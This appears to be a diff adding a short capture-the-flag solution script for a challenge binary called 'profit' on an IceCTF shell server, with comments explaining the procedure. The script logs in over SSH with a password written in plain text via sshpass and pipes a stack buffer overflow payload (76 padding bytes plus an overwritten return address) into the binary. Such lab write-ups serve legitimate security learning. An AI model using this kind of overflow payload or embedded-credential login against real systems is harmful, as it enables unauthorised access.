@@ -1,0 +1,6 @@
+# This is the process, but it will not show you the flag because
+# stderr is not sent over the SSH connection unfortunately. 
+# But follow this procedure
+# You can get all this info with pattern.py and readelf -s
+
+sshpass -p68IG7pOt ssh ctf-85132@shell.icec.tf -p 22 "echo `python -c \"print 'A'*76 + '\x0b\x85\x04\x08' \"` | /home/profit/profit 2>&1" 2>&1
